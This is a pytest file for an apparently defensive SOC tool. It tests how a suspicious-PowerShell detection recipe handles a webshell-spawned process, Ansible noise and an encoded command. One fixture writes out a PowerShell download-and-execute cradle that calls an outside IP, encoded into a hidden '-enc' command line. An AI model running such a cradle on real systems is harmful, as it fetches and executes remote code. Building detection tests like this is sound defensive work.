"""suspicious_process(host 层)迁移测试:seed-dict 型 recipe → 结构化 Forensics/Finding。

★seed-dict 型:base 证据取自 recipe 的第三参 seed(event/subject/related),不走 cypher;
仅当主语进程有 process_guid 才补查图(父链 + 子进程后续行为)。故:
  - 攻击态:seed 带 process_guid → FakeGraph mock 补查那步(w3wp 父 + 后续外连)。
  - 良性态:命中 Ansible 供给噪声、无 process_guid → 走纯 seed 路径,graph 绝不被调用(_NoGraph 守卫)。

finding 词典:suspproc.process(触发)/ anomalous_parent(红)/ decoded_malicious(红)/
provisioning_noise(白)/ followup_exfil(红)。bindings:process(image 保留)、host。
"""
import base64
from pathlib import Path

import pytest

from soc_agent.forensics import Forensics
from soc_agent.models import Alert
from soc_agent.skills_runtime import SkillRegistry

_SKILLS = Path(__file__).resolve().parents[1] / "skills"


class FakeGraph:
    """按 Cypher 子串返回预置行(子串须在各查询里唯一),仅用于 mock「补查那步」。"""

    def __init__(self, table):
        self.table = table                       # list[(substr, rows)]

    def run_cypher(self, query, **params):
        for substr, rows in self.table:
            if substr in query:
                return rows
        return []


class _NoGraph:
    """守卫:seed-dict 无 process_guid 时 recipe 必须不查图 —— 一旦调用就炸。"""

    def run_cypher(self, query, **params):
        raise AssertionError("无 process_guid 不应触发 cypher 补查(seed-dict 型应纯 seed 取数)")


def _suspicious_process():
    return SkillRegistry(_SKILLS).by_name("suspicious_process").recipe


def _enc(payload: str) -> str:
    """构造真实的 PowerShell -EncodedCommand base64(UTF-16LE),供 decode_chain 解回真身。"""
    return base64.b64encode(payload.encode("utf-16-le")).decode()


# ---------- ① 攻击态:w3wp 父进程派生 powershell + 后续外连 ----------
def test_attack_anomalous_parent_and_followup_exfil_emit_red():
    seed = {
        "event": {"event_code": "1", "integrity_level": "System"},
        "subject": {"image": "powershell.exe",
                    "command_line": "powershell.exe -ExecutionPolicy Bypass -File update.ps1",
                    "process_guid": "g-attack", "pid": 4444},
        "related": [{"rel": "ON_HOST", "node": {"hostname": "castelblack"}}],
    }
    graph = FakeGraph([
        # 父链补查:w3wp(webshell 载体)派生了 powershell
        ("gp:Process)-[:SPAWNED]->(p) RETURN gp.image AS parent_image",
         [{"parent_image": r"C:\Windows\System32\inetsrv\w3wp.exe", "image": "powershell.exe"}]),
        # 子进程后续行为:向外连了 IP
        ("collect(DISTINCT d.image)[0..10] AS descendants",
         [{"descendants": ["cmd.exe"], "out_ips": ["45.9.148.20"], "accessed_procs": []}]),
    ])
    a = Alert.from_node({"alert_uid": "sp-att", "technique_ids": ["T1059.001"]})
    fo = _suspicious_process()(graph, a, seed)

    assert isinstance(fo, Forensics)
    ids = fo.finding_ids()
    assert "suspproc.process" in ids                       # 触发本身(neutral)
    assert "suspproc.anomalous_parent" in ids              # w3wp → powershell(red)
    assert "suspproc.followup_exfil" in ids                # 后续外连(red)
    assert "suspproc.provisioning_noise" not in ids        # 非配管噪声
    assert "suspproc.decoded_malicious" not in ids         # 命令行无恶意特征、无编码

    # 承重字段:parent_image 原值进 attrs(可移植指纹 key)
    ap = next(f for f in fo.findings if f.finding_id == "suspproc.anomalous_parent")
    assert ap.polarity == "red"
    assert "w3wp.exe" in (ap.attrs.get("parent_image") or "")
    assert ap.attrs.get("image") == "powershell.exe"
    fx = next(f for f in fo.findings if f.finding_id == "suspproc.followup_exfil")
    assert fx.attrs["has_outbound"] is True and fx.attrs["has_lsass_access"] is False
    trig = next(f for f in fo.findings if f.finding_id == "suspproc.process")
    assert trig.polarity == "neutral" and trig.attrs == {"event_code": "1", "integrity_level": "System"}

    # bindings:process(image 保留)+ host(抽象)
    assert fo.bindings["process"] == "powershell.exe"
    assert fo.bindings["host"] == "castelblack"

    # 人读证据(prose)仍在,喂 LLM
    assert fo.context.get("触发事件") and fo.context.get("父进程")
    assert fo.context["子进程后续行为"]["out_ips"] == ["45.9.148.20"]


# ---------- ② 良性态:Ansible 配管供给噪声(EID4104 无 process_guid,纯 seed) ----------
def test_benign_provisioning_noise_emits_white_no_red():
    seed = {
        "event": {"event_code": "4104",
                  "script_block_text": "ConvertFrom-AnsibleJson; Write-AnsibleLog 'exec_wrapper ok'"},
        "subject": {"image": "powershell.exe",
                    "command_line": "powershell.exe -Command ConvertFrom-AnsibleJson"},
        "related": [{"rel": "ON_HOST", "node": {"hostname": "winterfell"}}],
    }
    a = Alert.from_node({"alert_uid": "sp-ben", "technique_ids": ["T1059.001"]})
    # 无 process_guid → 绝不查图:传 _NoGraph,一旦被调用即失败
    fo = _suspicious_process()(_NoGraph(), a, seed)

    assert isinstance(fo, Forensics)
    ids = fo.finding_ids()
    assert "suspproc.process" in ids                       # 触发本身仍在
    assert "suspproc.provisioning_noise" in ids            # Ansible 供给噪声(white)
    # red 一个都不触发
    assert "suspproc.anomalous_parent" not in ids
    assert "suspproc.decoded_malicious" not in ids
    assert "suspproc.followup_exfil" not in ids

    pn = next(f for f in fo.findings if f.finding_id == "suspproc.provisioning_noise")
    assert pn.polarity == "white"
    assert "ansible_exec_wrapper" in (pn.attrs.get("label") or "")   # label 承重(哪类噪声)

    assert fo.bindings["process"] == "powershell.exe"
    assert fo.bindings["host"] == "winterfell"
    assert "父进程" not in fo.context                        # 未补查图 → 无父进程证据
    assert fo.context.get("供给/自检噪声")


# ---------- ③ 编码 PowerShell 解码后含远程下载执行 → decoded_malicious(红) ----------
def test_encoded_download_cradle_emits_decoded_malicious():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/x.ps1')"
    seed = {
        "event": {"event_code": "4104"},
        "subject": {"image": "powershell.exe",
                    "command_line": f"powershell.exe -nop -w hidden -enc {_enc(payload)}"},
        "related": [{"rel": "ON_HOST", "node": {"hostname": "braavos"}}],
    }
    a = Alert.from_node({"alert_uid": "sp-enc", "technique_ids": ["T1059.001"]})
    fo = _suspicious_process()(_NoGraph(), a, seed)         # 无 guid → 不查图

    ids = fo.finding_ids()
    assert "suspproc.decoded_malicious" in ids              # 解码后含 DownloadString(red)
    assert "suspproc.provisioning_noise" not in ids
    dm = next(f for f in fo.findings if f.finding_id == "suspproc.decoded_malicious")
    assert dm.polarity == "red"
    # recipe 已连锁解码,真身进 context 供 LLM
    decoded = fo.context.get("解码后命令(逐层)") or {}
    assert any("DownloadString" in layer for layers in decoded.values() for layer in layers)
